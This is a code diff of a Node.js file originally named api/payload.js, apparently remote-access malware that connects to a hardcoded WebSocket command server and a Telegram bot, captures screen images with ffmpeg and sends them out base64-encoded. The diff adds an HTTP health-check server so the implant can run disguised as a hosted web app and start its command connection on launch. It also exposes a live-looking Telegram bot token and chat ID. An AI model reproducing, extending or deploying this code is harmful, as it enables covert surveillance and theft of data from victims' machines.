@@ -1,13 +1,13 @@
-// api/payload.js
 const WebSocket = require('ws');
 const { exec } = require('child_process');
 const fs = require('fs');
 const os = require('os');
 const path = require('path');
 const https = require('https');
+const http = require('http');
 
 // --- CONFIGURATION ---
-const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 
+const WS_URL = 'wss://server-eight-pi-39.vercel.app';
 const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
 const TELEGRAM_CHAT_ID = '6172226452';
 
@@ -101,7 +101,7 @@ function captureScreen() {
     if (!ws || ws.readyState !== WebSocket.OPEN) return;
 
     const imgPath = path.join(os.tmpdir(), 'screen.png');
-    
+
     // Simplified screen capture command
     exec(`ffmpeg -y -f lavfi -i testsrc=duration=1:size=320x240:rate=1 ${imgPath}`, (err) => {
         // If avfoundation fails, this fallback ensures no crash
@@ -111,20 +111,20 @@ function captureScreen() {
                  if (!err2 && fs.existsSync(imgPath)) {
                      const img = fs.readFileSync(imgPath);
                      // FIX: Stringify the object before sending
-                     ws.send(JSON.stringify({ 
-                         type: 'screen_data', 
-                         id: myId, 
-                         data: img.toString('base64') 
+                     ws.send(JSON.stringify({
+                         type: 'screen_data',
+                         id: myId,
+                         data: img.toString('base64')
                      }));
                  }
              });
         } else if (!err && fs.existsSync(imgPath)) {
             const img = fs.readFileSync(imgPath);
             // FIX: Stringify the object before sending
-            ws.send(JSON.stringify({ 
-                type: 'screen_data', 
-                id: myId, 
-                data: img.toString('base64') 
+            ws.send(JSON.stringify({
+                type: 'screen_data',
+                id: myId,
+                data: img.toString('base64')
             }));
         }
     });
@@ -182,10 +182,31 @@ function keepAlive() {
     setInterval(() => {}, 60000);
 }
 
+// --- RENDER WEB APP SERVER SETUP ---
+const PORT = process.env.PORT || 3000;
 
+const server = http.createServer((req, res) => {
+    // Health check endpoint for Render
+    if (req.url === '/health') {
+        res.writeHead(200, { 'Content-Type': 'text/plain' });
+        res.end('OK');
+        return;
+    }
 
-// Start the connection
-initConnection();
+    // Basic response for root or other paths
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ 
+        status: 'running', 
+        id: myId || 'pending_connection',
+        timestamp: new Date().toISOString()
+    }));
+});
+
+server.listen(PORT, () => {
+    console.log(`HTTP Server listening on port ${PORT}`);
+    // Start the WebSocket connection once the HTTP server is ready
+    initConnection();
+});
 
 // Keep the process alive even if WebSocket fails
 setInterval(() => {}, 60000);
